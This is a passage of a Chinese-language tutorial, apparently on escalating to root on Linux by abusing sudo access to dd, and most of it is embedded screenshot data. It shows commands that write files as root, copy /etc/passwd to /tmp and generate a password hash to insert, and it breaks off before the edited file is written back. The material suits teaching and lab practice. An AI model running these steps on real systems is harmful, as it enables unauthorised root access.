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" width="823" height="166" class="img_ev3q"></p>
<p>这表明我们可以使用 echo 将数据写入文件。现在，因为我们有写权限，所以我们可以覆盖任何我们想要的文件。</p>
<p>不幸的是，我们将用一行覆盖该文件，因此替换任何重要文件（例如： passwd、shadow、sudoers和crontab ）都是非常危险的。</p>
<p>或者，我们可以以 root 身份编写一个新文件，但这对我们没有任何帮助……</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;This file is owned by root&quot; | sudo dd of=/tmp/test</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048436-530816501-a70a374d1eb89d81944475706c249037.png" width="675" height="142" class="img_ev3q"></p>
<p>那么我们如何利用这一点呢？</p>
<p>结合文件读取和文件写入漏洞来有效编辑文件</p>
<p>通常感觉这可能是一条死胡同；然而，这也可能归结为理解二进制文件的工作原理。</p>
<p>例如，使用<strong>dd</strong>我们可以结合文件读取（输入文件）和文件写入（输出文件）来有效地编辑文件。</p>
<p>为此，我们将以 <strong>/etc/passwd</strong> 文件为目标，因为它是世界可读的。</p>
<p>首先，我们需要将<strong>passwd</strong>文件复制到可写目录中。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /etc/passwd /tmp</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20240517165048377-755855014-2ac7a3b2e448b344152a15ac7633bac6.png" width="703" height="853" class="img_ev3q"></p>
<p>接下来，我们需要返回攻击者机器并使用 <strong>openssl</strong>创建一个哈希密码。对于这个例子，我们将保持简单并将密码设置为“ <strong>password</strong> ”。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">openssl passwd password</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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